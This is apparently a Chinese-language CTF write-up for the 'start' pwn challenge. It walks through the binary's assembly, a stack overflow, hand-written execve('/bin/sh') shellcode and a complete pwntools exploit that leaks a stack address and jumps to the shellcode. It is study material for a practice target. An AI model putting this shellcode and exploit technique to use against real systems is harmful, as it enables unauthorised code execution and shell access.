---
title: pwnable_start
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- stackoverflow
- asm

---

没有C语言代码，是个汇编的程序，考察基础的汇编

<!-- more -->

查壳后发现32位保护都没开，在ida中程序是用汇编代码写的，只有简单的write和read功能。

```asm

.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch ; '<'
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX - sys_read
.text:08048099                 add     esp, 14h
.text:0804809C                 retn

```

其实就是如下代码：

```c

write(1,addr,0x14)
read(0,addr,0x3c)

```

明显的栈溢出，保护没开可以使用shellcode来get shell。不过pwntools自带的shellcode太长了，只能自己写shellcode。

```python
shellcode=asm(
'''
    xor ecx , ecx;
    xor edx , edx;
    push 0x0068732f;    #\x00hs/
    push 0x6e69622f;    #nib/
    mov ebx , esp;
    mov al , 0xb;
    int 0x80
'''
)
```

有了shellcode之后，要让程序能够执行shellcode，为此我们需要得到一个栈上的地址，并合理的排布栈空间，让ret指令能跳转到shellcode。

可以利用栈溢出，将返回地址覆盖为0x08048087，再次执行write指令，输出当前esp指向的内存，这也是一开始push进栈的esp，是当前esp的地址+0x4，由此我们可以得到一个栈地址。

在这之后还会有一次read，会从当前esp指向的地方开始输入，由于最后有一个add esp 14h，我们可以知道0x14个字节后的位置会被ret指令pop eip，因此此处应该放置shellcode的**起始地址**，这个地址通过之前得到的栈地址和偏移计算出来。

如果read开始输入的地址是x，那么我们之前得到的地址stack_addr是x+0x4，在x+0x14的地方放置shellcode的**起始地址**，shellcode被我们放置在x+0x18，紧跟着起始地址，因此起始地址应该是stack_addr+0x14。

**push指令的小区别**

一开始不太理解为什么是stack+0x14，后来查了一下资料，发现push指令执行时会有些区别。

如果是push一个**立即数**，或**除了esp之外的寄存器**，那么push指令就相当于:

```asm
lea esp , dword ptr ds:[esp-0x4];   //把esp-0x4这个地址写到esp，即先移动esp
mov dword ptr ds:[esp] , xxx;   //再在esp处写入数据
```

push会先移动esp，再把内容写入当前esp指向的位置。

但如果是push esp，那么push指令就是：

```asm
mov dword ptr ds:[esp-0x4] , esp;   //将esp寄存器中存的地址写到esp-0x4的位置，先把esp的内容放到栈上
lea esp , dword ptr ds:[esp-0x4];   //将esp-0x4这个地址写到esp，即移动esp
```

push会先将当前的esp写到esp-0x4，然后再移动esp，毕竟移动esp后再写到栈上好像没有什么意义，后面pop esp和没有pop一样。

exp:

```python
from pwn import*
p=process('./start')
#p=remote('node4.buuoj.cn',28732)
context.arch='i386'
context.log_level='debug'
padding=0x14

gdb.attach(p)

shellcode=asm(
'''
    xor ecx , ecx;
    xor edx , edx;
    push 0x0068732f;
    push 0x6e69622f;
    mov ebx , esp;
    mov al , 0xb;
    int 0x80
'''
)
print("this is shellcode : ",shellcode)
p.recv()
payload1='a'*padding+p32(0x08048087)
p.send(payload1)
stack_addr=u32(p.recv(4))
print("this is the stack addr : ",hex(stack_addr))

payload2='a'*padding+p32(stack_addr+0x14)+shellcode
p.send(payload2)
p.interactive()

```
